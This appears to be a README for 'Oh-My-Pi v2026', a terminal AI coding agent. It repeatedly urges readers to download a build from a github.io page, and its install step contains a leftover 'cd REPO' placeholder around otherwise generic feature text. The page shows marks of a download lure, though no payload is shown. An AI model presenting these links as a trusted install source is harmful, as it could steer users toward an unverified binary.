# Oh-My-Pi v2026 - AI coding agent CLI 2026

> **A terminal-first AI coding companion for the command line, built for hash-anchored edits, LSP-aware workflows, and multi-provider agent control in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-terminal-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylerx82/oh-my-pi-multi-agent?style=flat-square)](https://github.com/tylerx82/oh-my-pi-multi-agent)

---

<p align="center">
  <a href="https://tylerx82.github.io/oh-my-pi-multi-agent/">
    <img src="https://img.shields.io/badge/Download-Oh-My-Pi%20Latest-brightgreen?style=for-the-badge" alt="Download Oh-My-Pi">
  </a>
</p>

> **[Direct Download - Oh-My-Pi v2026](https://tylerx82.github.io/oh-my-pi-multi-agent/)**

---

[Download Latest Build](https://tylerx82.github.io/oh-my-pi-multi-agent/)

---

## What is Oh-My-Pi?

Oh-My-Pi is an AI coding agent that runs in the terminal and is meant for command-line-centered developer workflows. It pairs a TUI-oriented experience with tool-based execution, letting you switch between planning, editing, and validation without leaving the CLI.

The focus is on hands-on coding work: applying precise file edits, using language tooling, coordinating subagents, and integrating with multiple AI providers. It suits developers who want an assistant that can work with local models, OpenAI-compatible setups, Claude-based workflows, or mixed-provider environments.

---

## Capabilities

- Hash-anchored file editing for exact, auditable changes
- Tool harness tuned for agent actions and task execution
- LSP integration for language-aware edits and feedback loops
- Python environment management for development workflows
- Browser control for tasks that require web interaction
- Multi-agent orchestration with subagent coordination
- Support for multiple AI providers across common model backends
- Local LLM support for offline or self-hosted setups

---

## Installation

Clone the repository, then open it in your terminal environment:

```bash
git clone https://github.com/tylerx82/oh-my-pi-multi-agent.git
cd REPO
```

Complete the setup steps for your chosen runtime and provider, then start the CLI from the repository root. If your distribution is packaged, download the latest build and run it from the extracted directory.

---

## How to Use

Launch the agent in your terminal and pick the workflow that fits the job:

1. Open a project or point the tool at a workspace.
2. Ask it to inspect code, plan changes, or carry out a coding task.
3. Allow the agent to use LSP, browser tools, or subagents when appropriate.
4. Inspect the proposed file changes before you apply them.

The exact flow varies by setup, but it usually revolves around interactive command-line sessions, task prompts, and iterative edits backed by anchored file updates.

---

## Configuration

Configuration is usually managed through local project files, environment variables, or provider-specific settings. If you connect to hosted models or a local LLM, store API keys, endpoints, and model selections in environment configuration instead of hard-coding them.

Example structure:

```bash
AI_PROVIDER=openai
AI_MODEL=your-model-name
LOCAL_LLM_ENDPOINT=http://localhost:11434
```

If the repository provides a config file, use it to define tool access, agent behavior, and editor integration preferences.

---

## Requirements

- A terminal environment
- A supported runtime for the project setup
- Access to one or more AI providers, or a local LLM endpoint
- Python support for workflows that depend on environment management
- Optional browser access for automation tasks
- Optional language server support for LSP-enabled features

---

## FAQ

**How do I update Oh-My-Pi?**  
Download the latest build or pull the newest repository changes, then restart the CLI.

**Where do I change provider settings?**  
Use the project configuration files or environment variables, depending on how you installed it.

**Can I use a local model?**  
Yes, local LLM support is part of the profile, so you can connect a self-hosted model when configured.

**What if browser or LSP features are not working?**  
Check that the related dependencies, services, or endpoints are available in your environment, then review the tool configuration.

**Is there support for multiple agents?**  
Yes, the project includes multi-agent orchestration and subagent-based workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
